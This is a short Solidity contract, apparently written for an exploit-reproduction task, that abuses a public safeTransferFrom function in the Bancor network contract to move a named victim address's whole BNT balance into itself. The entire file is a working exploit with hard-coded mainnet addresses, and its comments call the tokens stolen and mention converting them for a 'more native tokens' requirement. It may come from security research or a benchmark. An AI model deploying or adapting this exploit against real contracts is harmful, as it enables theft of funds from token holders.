interface IBancorNetwork {
    function safeTransferFrom(address _token, address _from, address _to, uint256 _value) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract Strategy {
    address public constant BANCOR_NETWORK = 0x5f58058C0eC971492166763c8C22632B583F667f;
    address public constant BNT = 0x1F573D6Fb3F13d689FF844B4cE37794d79a7FF1C;
    address public constant VICTIM = 0xf05e96f90486664f622724649a06f45f6704eB0d;

    function run() public {
        uint256 victimBalance = IERC20(BNT).balanceOf(VICTIM);
        // The vulnerability is the public safeTransferFrom in TokenHandler
        // which BancorNetwork inherits.
        IBancorNetwork(BANCOR_NETWORK).safeTransferFrom(BNT, VICTIM, address(this), victimBalance);

        // Transfer stolen BNT to the strategy contract's owner (handled by DexUtils later if needed)
        // For now, just keep it in the contract to satisfy the "more native tokens" or "more tokens" requirement.
        // Actually, the requirement is more native tokens. We'll use DexUtils.
    }
}
